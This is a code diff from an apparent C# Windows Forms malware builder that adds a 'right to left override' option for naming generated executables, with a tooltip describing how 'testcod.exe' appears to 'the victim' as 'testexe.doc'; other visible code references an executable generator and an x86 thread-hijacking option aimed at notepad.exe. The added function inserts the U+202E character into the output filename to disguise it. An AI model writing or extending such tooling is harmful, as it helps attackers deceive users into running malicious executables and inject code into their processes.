@@ -113,10 +113,14 @@ namespace WindowsFormsApp1
         private void Form1_Load(object sender, EventArgs e)
         {
             genExe.Enabled = false;
+            RTLOtip.SetToolTip(RTLOCheckBox, "RIGHT TO LEFT OVERRIDE is a Unicode mainly used for the writing and the reading of Arabic or Hebrew text.\n " +
+                "It is used to disguise the names of files. For example the file testcod.exe will be displayed to the victim as testexe.doc");
         }
 
         private void button1_Click(object sender, EventArgs e)
         {
+            string filename;
+            label8.Text = "Path:";
             SaveFileDialog saveFileDialog1 = new SaveFileDialog();
 
             saveFileDialog1.Filter = "exe files (*.exe)|*.exe";
@@ -124,11 +128,23 @@ namespace WindowsFormsApp1
             saveFileDialog1.RestoreDirectory = true;
 
             if (saveFileDialog1.ShowDialog() == DialogResult.OK)
-            {      
-                label8.Text += saveFileDialog1.FileName;
-                filepath = saveFileDialog1.FileName;
+            {
+                if (RTLOCheckBox.Checked)
+                {
+                    string tmp = saveFileDialog1.FileName;
+                    int i = tmp.LastIndexOf('.') - 4;
+
+                    string rtlo = "\x202e";
+
+                    filename = tmp.Substring(0, i+1) + rtlo + tmp.Substring(i+1);
+
+                }
+                else filename = saveFileDialog1.FileName;
+
+                label8.Text += filename;
+                filepath = filename;
+                genExe.Enabled = true;
             }
-            genExe.Enabled = true;
 
         }
 
@@ -156,7 +172,12 @@ namespace WindowsFormsApp1
 
         private void threadHijackin_x86_CheckedChanged(object sender, EventArgs e)
         {
-            procBox.Text = "notepad.exe(32);";
+            procBox.Text = "notepad.exe(32)";
+        }
+
+        private void groupBox1_Enter(object sender, EventArgs e)
+        {
+
         }
     }
 }
